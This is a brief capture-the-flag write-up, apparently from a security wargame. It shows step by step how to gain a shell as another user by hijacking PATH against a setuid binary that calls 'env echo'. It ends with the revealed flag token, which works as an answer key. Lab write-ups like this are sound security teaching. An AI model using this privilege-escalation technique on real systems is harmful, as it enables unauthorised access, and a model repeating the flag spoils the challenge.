## level03 writeup

When logging in as the level03 user, we can find a binary.
```shell
$ ls -la
...
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
...
```
This binary has the suid bit, which means its gonna be executed as the owner of the file, which in this case is the user flag03. \
We want to check what's in the binary. First thing that comes to mind is executing the string function on the binary.
```shell
$ strings ./level03
...
system
...
/usr/bin/env echo Exploit me.
...
```
So we can see it uses `/usr/bin/env echo Exploit Me` in the `system()` call. The basic idea is to replace echo with a shell, so we can execute binaries as flag03 (in particular the getflag binary). \
We know we can create files in /tmp and modify the PATH variable so binaries are searched first in the /tmp folder.

```shell
$ cat > /tmp/echo <<EOF
/bin/sh
EOF
$ chmod +x /tmp/echo
$ export PATH=/tmp:$PATH
$ ./level03
$ # we are know in a shell with the permissions of the flag03 user
$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
